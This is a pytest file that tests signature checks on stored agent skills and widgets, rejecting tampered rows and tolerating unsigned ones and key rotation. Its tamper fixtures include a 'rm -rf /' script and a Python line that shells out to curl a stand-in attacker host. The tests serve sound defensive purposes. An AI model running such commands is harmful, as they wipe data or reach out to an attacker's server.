"""Phase 2 verify-on-read at the loader entrypoints.

The loader is what turns a tampered DB row into "agent reads tampered
content". Phase 2 inserts a signature check before the embed gate
(skills) or before the in-memory registry update (widgets) so a
tampered row never reaches runtime.

These tests exercise the verify-on-read predicate directly — the
loader bodies are exercised by their existing integration tests; here
we just lock in the gate's three branches: signed-and-clean,
unsigned (NULL), and tampered.
"""
from __future__ import annotations

from types import SimpleNamespace

import pytest

from app.services import manifest_signing as ms


@pytest.fixture
def signing_key(monkeypatch):
    monkeypatch.setattr(
        "app.services.manifest_signing.settings.MANIFEST_SIGNING_KEY", "phase2-key"
    )
    monkeypatch.setattr(
        "app.services.manifest_signing.settings.ENCRYPTION_KEY", "fallback"
    )
    yield "phase2-key"


# -- Skills ---------------------------------------------------------------


def test_skill_load_gate_passes_signed_clean_row(signing_key):
    sig = ms.sign_skill_payload("body", [])
    row = SimpleNamespace(content="body", scripts=[], signature=sig)
    assert ms.verify_skill_row(row) is True


def test_skill_load_gate_passes_unsigned_row():
    """Phase 1 unsigned rows continue to load (NULL signature). Drift
    detector still flags them via ``content_hash`` mismatch when present."""
    row = SimpleNamespace(content="anything", scripts=[], signature=None)
    assert ms.verify_skill_row(row) is True


def test_skill_load_gate_refuses_tampered_row(signing_key):
    """Persisted signature stays put while content gets edited under
    the writer (e.g. raw SQL UPDATE) — verify_skill_row must catch it."""
    sig = ms.sign_skill_payload("original", [])
    row = SimpleNamespace(content="malicious", scripts=[], signature=sig)
    assert ms.verify_skill_row(row) is False


def test_skill_load_gate_catches_script_body_swap(signing_key):
    """Scripts are part of the canonical payload — a swapped script
    body must fail verification even when ``content`` is unchanged."""
    sig = ms.sign_skill_payload(
        "body", [{"name": "s", "script": "echo safe"}]
    )
    row = SimpleNamespace(
        content="body",
        scripts=[{"name": "s", "script": "rm -rf /"}],
        signature=sig,
    )
    assert ms.verify_skill_row(row) is False


# -- Widgets --------------------------------------------------------------


def test_widget_load_gate_passes_signed_clean_row(signing_key):
    sig = ms.sign_widget_payload("yaml: 1", "print('safe')")
    row = SimpleNamespace(
        yaml_template="yaml: 1", python_code="print('safe')", signature=sig,
    )
    assert ms.verify_widget_row(row) is True


def test_widget_load_gate_passes_unsigned_row():
    row = SimpleNamespace(
        yaml_template="yaml: 1", python_code=None, signature=None,
    )
    assert ms.verify_widget_row(row) is True


def test_widget_load_gate_catches_python_code_tamper(signing_key):
    """Python code is part of the canonical payload (Phase 2 closes the
    Phase 1 yaml-only gap) — a code-only swap fails verification."""
    sig = ms.sign_widget_payload("yaml: 1", "print('safe')")
    row = SimpleNamespace(
        yaml_template="yaml: 1",
        python_code="import os; os.system('curl evil.example')",
        signature=sig,
    )
    assert ms.verify_widget_row(row) is False


def test_widget_load_gate_catches_yaml_tamper(signing_key):
    sig = ms.sign_widget_payload("safe: yaml", None)
    row = SimpleNamespace(
        yaml_template="evil: yaml", python_code=None, signature=sig,
    )
    assert ms.verify_widget_row(row) is False


# -- Key rotation safety --------------------------------------------------


def test_load_gate_treats_missing_key_as_unverifiable(signing_key, monkeypatch):
    """If the operator rotates ``MANIFEST_SIGNING_KEY`` without re-running
    trust-current-state, every row is "un-verifiable" rather than
    "tampered" — the gate returns True and the audit surfaces the drift
    so the operator notices. Otherwise key rotation alone would lock the
    operator out of every previously-signed row."""
    sig = ms.sign_skill_payload("body", [])
    monkeypatch.setattr(
        "app.services.manifest_signing.settings.MANIFEST_SIGNING_KEY", ""
    )
    monkeypatch.setattr(
        "app.services.manifest_signing.settings.ENCRYPTION_KEY", ""
    )
    row = SimpleNamespace(content="body", scripts=[], signature=sig)
    assert ms.verify_skill_row(row) is True
